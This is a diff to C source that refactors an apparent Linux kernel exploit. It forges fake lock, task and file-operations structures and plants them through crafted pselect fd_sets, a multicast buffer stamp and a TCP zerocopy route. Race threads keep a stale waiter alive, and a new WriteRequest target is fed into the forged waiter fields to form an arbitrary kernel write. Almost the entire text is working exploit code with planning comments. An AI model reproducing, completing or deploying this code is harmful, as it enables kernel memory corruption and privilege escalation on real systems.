@@ -11,8 +11,6 @@
 static double fops_elapsed_ms(struct timespec *ref) {
   return runtime_elapsed_ms(ref);
 }
-extern int pselect_custom_write;
-
 int route_last_step;
 int route_last_errno;
 
@@ -146,13 +144,19 @@ void kernel5_resident_stop(void) {
 /* Decoupling plan: execute the one-shot multicast waiter route. Input: route,
  * profile, payload and race contexts; output: RouteStatus. Future:
  * multicast_waiter_execute(); route_last_* becomes the returned status. */
-void do_kernel5_fake_lock_route(void) {
+void do_kernel5_fake_lock_route(const WriteRequest *request) {
+  (void)request;
   size_t stamp_size = active_offsets->mcast_buffer_size;
   size_t waiter_off = (size_t)active_offsets->mcast_waiter_off;
   unsigned char stamp[stamp_size];
   memset(stamp, 0, sizeof(stamp));
-  put64(stamp, waiter_off + active_offsets->mcast_task_offset, fake_task);
-  put64(stamp, waiter_off + active_offsets->mcast_lock_offset, fake_lock);
+  // TODO(decoupling:S13-multicast-profile): Future:
+  // build_multicast_waiter_payload() receives MulticastWaiterLayout.
+  // Input: immutable route layout; output: encoded stamp bytes.
+  // Blocked by: route profile/context migration; completion removes this TODO.
+  build_multicast_waiter_payload(
+      stamp, waiter_off, active_offsets->mcast_task_offset,
+      active_offsets->mcast_lock_offset, fake_task, fake_lock);
   uint16_t family = AF_UNSPEC;
   memcpy(stamp + 8, &family, sizeof(family));
 
@@ -299,7 +303,8 @@ static void *tcp_punch_thread(void *arg) {
 /* Decoupling plan: prepare, execute and clean the TCP zerocopy route. Input:
  * session payload/race state; output: RouteStatus. Future: split into
  * tcp_zerocopy_prepare/execute/disarm/destroy with context-owned resources. */
-void do_tcp_fake_lock_route(void) {
+void do_tcp_fake_lock_route(const WriteRequest *request) {
+  (void)request;
   if (!page_base || !fake_lock || !fake_fops) {
     route_last_step = 40;
     route_last_errno = 0;
@@ -621,12 +626,17 @@ static void restore_standard_io(void) {
 /* Decoupling plan: build the compact/tree select-stack waiter image. Inputs:
  * profile, payload layout and write request; output: three fd_sets. Future:
  * select_stack_build_fdsets(profile, payload, request, result). */
-void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
+void prepare_pselect_fdsets(
+    fd_set *in, fd_set *out, fd_set *ex, const WriteRequest *request) {
   FD_ZERO(in);
   FD_ZERO(out);
   FD_ZERO(ex);
 
   int words_per_set = pselect_words_per_set();
+  // TODO(decoupling:S12-select-profile): Future:
+  // select_stack_build_fdsets() receives SelectStackLayout.
+  // Input: immutable layout/request; output: three encoded fd_sets.
+  // Blocked by: select route context migration; completion removes this TODO.
   int compact = active_offsets && active_offsets->compact_waiter;
 
   struct pselect_waiter_word {
@@ -645,10 +655,10 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     struct pselect_waiter_word words[] = {
       {2, relink_pc, "tree_pc"},
       {3, 0, "tree_right"},
-      {4, relink_left, "tree_left"},
-      {5, relink_pc, "pi_pc"},
+      {4, request->target, "tree_left"},
+      {5, fake_right, "pi_pc"},
       {6, 0, "pi_right"},
-      {7, relink_left, "pi_left"},
+      {7, request->target, "pi_left"},
       {8, fake_task, "task"},
       {9, fake_lock, "lock"},
       {10, ((uint64_t)FAKE_WAITER_PRIO << 32) | 3, "wake_prio"},
@@ -688,7 +698,7 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
 /* Decoupling plan: prepare, execute and clean the select-stack route. Input:
  * session payload/race state; output: RouteStatus. Future: split into
  * select_stack_prepare/execute/disarm/destroy; dirty failures retain ownership. */
-void do_pselect_fake_lock_route(void) {
+void do_pselect_fake_lock_route(const WriteRequest *request) {
   if (!page_base || !fake_lock || !fake_fops) {
     route_last_step = 30;
     route_last_errno = 0;
@@ -703,9 +713,62 @@ void do_pselect_fake_lock_route(void) {
   SYSCHK(pipe(pipefd));
 
   int compact_route = active_offsets && active_offsets->compact_waiter;
-  int attempts = compact_route ? PSELECT_CFI_ROUTE_ATTEMPTS : 1;
-  long compact_timeout_sec;
-  long compact_timeout_usec;
+
+  /* Both routes park on a never-ready timerfd: the waiter must stay stale
+   * on the pselect stack for the whole consumer window. */
+  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
+  if (block_fd < 0) {
+    pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
+               errno);
+    block_fd = pipefd[0];
+  }
+  int high_read = fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16);
+  if (high_read < 0) {
+    route_last_step = 31;
+    route_last_errno = errno;
+    pr_error("pselect F_DUPFD read errno=%d\n", errno);
+    if (block_fd != pipefd[0]) {
+      close(block_fd);
+    }
+    close(pipefd[0]);
+    close(pipefd[1]);
+    return;
+  }
+
+  fd_set in;
+  fd_set out;
+  fd_set ex;
+  prepare_pselect_fdsets(&in, &out, &ex, request);
+  pr_info("pselect route setup shift=%d page=%016zx "
+          "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
+          "in0=%016llx in3=%016llx out0=%016llx ex0=%016llx "
+          "ex1=%016llx ex2=%016llx ex3=%016llx\n",
+          pselect_waiter_shift(),
+          page_base, fake_lock, fake_w0, fake_task,
+          (unsigned long long)fdset_get_word(&in, 0),
+          (unsigned long long)fdset_get_word(&in, 3),
+          (unsigned long long)fdset_get_word(&out, 0),
+          (unsigned long long)fdset_get_word(&ex, 0),
+          (unsigned long long)fdset_get_word(&ex, 1),
+          (unsigned long long)fdset_get_word(&ex, 2),
+          (unsigned long long)fdset_get_word(&ex, 3));
+
+  /* The route may replace low fds, including stdout and stderr. */
+  reserve_standard_io();
+  open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);
+  close(high_read);
+
+  atomic_store(&consumer_calls, 0);
+  atomic_store(&consumer_success, 0);
+  atomic_store(&punch_consume_stop, 0);
+  int delay_usec = route_delay_usec(1);
+  atomic_store(&main_route_delay_usec, delay_usec);
+  atomic_store(&punch_consume_go, 1);
+
+  pr_info("pselect pre-select compact=%d +%.0fms\n", compact_route,
+          fops_elapsed_ms(&route_t0));
+  errno = 0;
+  int ret;
   if (compact_route) {
     compact_timeout_values(&compact_timeout_sec, &compact_timeout_usec);
   }
